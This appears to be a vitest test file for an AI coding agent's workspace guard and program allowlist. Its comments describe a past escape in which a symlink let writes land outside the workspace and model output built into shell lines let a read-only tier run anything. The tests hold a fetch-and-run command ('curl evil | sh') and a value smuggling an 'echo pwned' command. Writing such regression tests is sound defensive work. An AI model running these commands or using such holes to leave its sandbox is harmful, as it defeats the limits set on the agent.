/**
 * The workspace boundary, and the shell that is no longer there.
 *
 * Both halves of this file exist because of a specific escape. `guardPath`
 * skipped its symlink check entirely for a file that did not exist yet, which
 * is every write; and the agent's own tools built shell command lines out of
 * model output, which made `read_only` — the tier whose whole promise is that
 * nothing is written — a way to run anything.
 */

import { describe, expect, it, beforeAll, afterAll } from "vitest";
import { mkdtempSync, mkdirSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { guardPath, PathTraversalError, validateProgramSafety } from "./security.js";

describe("guardPath", () => {
  let root: string;
  let outside: string;

  beforeAll(() => {
    root = mkdtempSync(join(tmpdir(), "sq-guard-ws-"));
    outside = mkdtempSync(join(tmpdir(), "sq-guard-out-"));
    writeFileSync(join(outside, "secret.txt"), "TOKEN=abc", "utf-8");
    mkdirSync(join(root, "src"), { recursive: true });
    writeFileSync(join(root, "src", "index.ts"), "export {};", "utf-8");
  });

  afterAll(() => {
    rmSync(root, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 });
    rmSync(outside, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 });
  });

  it("allows an ordinary path inside the workspace", () => {
    expect(() => guardPath(root, "src/index.ts")).not.toThrow();
    expect(() => guardPath(root, "does/not/exist/yet.ts")).not.toThrow();
  });

  it("refuses to climb out with ..", () => {
    expect(() => guardPath(root, "../secret.txt")).toThrow(PathTraversalError);
    expect(() => guardPath(root, "src/../../secret.txt")).toThrow(PathTraversalError);
  });

  it("refuses an absolute path to somewhere else", () => {
    expect(() => guardPath(root, join(outside, "secret.txt"))).toThrow(PathTraversalError);
  });

  it("refuses a write through a symlinked directory that does not exist yet", () => {
    /*
     * The hole this test exists for.
     *
     * The realpath check ran only when the *target* already existed, so it
     * covered reads and skipped every create. `ws/link -> /outside` plus a
     * write to `ws/link/planted.txt` was a write outside the workspace, and
     * nothing looked at it — the one case the function is for.
     */
    let linked = true;
    try {
      symlinkSync(outside, join(root, "escape"), "dir");
    } catch {
      // Windows without Developer Mode refuses to create symlinks. Nothing to
      // assert here, and skipping is honest — see the note below.
      linked = false;
    }
    if (!linked) return;

    expect(() => guardPath(root, "escape/planted.txt")).toThrow(PathTraversalError);
    // And the pre-existing file behind it, which the old check did catch.
    expect(() => guardPath(root, "escape/secret.txt")).toThrow(PathTraversalError);
  });
});

describe("validateProgramSafety", () => {
  it("allows the programs the agent's own tools run", () => {
    expect(() => validateProgramSafety(["rg", "-n", "pattern"])).not.toThrow();
    expect(() => validateProgramSafety(["git", "commit", "-m", "msg"])).not.toThrow();
  });

  it("compares on the bare name, so a path or an .exe still resolves", () => {
    expect(() => validateProgramSafety(["/usr/bin/git", "status"])).not.toThrow();
    expect(() => validateProgramSafety(["C:\\Program Files\\Git\\git.exe", "status"])).not.toThrow();
  });

  it("refuses anything not on the list", () => {
    expect(() => validateProgramSafety(["bash", "-c", "curl evil | sh"])).toThrow(/may run directly/);
    expect(() => validateProgramSafety(["sh"])).toThrow(/may run directly/);
    expect(() => validateProgramSafety([])).toThrow(/needs a program/);
  });

  it("is not fooled by a metacharacter, because there is no shell to feed it to", () => {
    /*
     * This is the shape of the old injection: a "query" that was really a
     * command. As argv it is simply an argument to ripgrep — the program is
     * still `rg`, and `; echo pwned` is text to search for.
     */
    expect(() =>
      validateProgramSafety(["rg", "--", 'x"; echo pwned > f.txt; echo "', "."]),
    ).not.toThrow();
  });
});
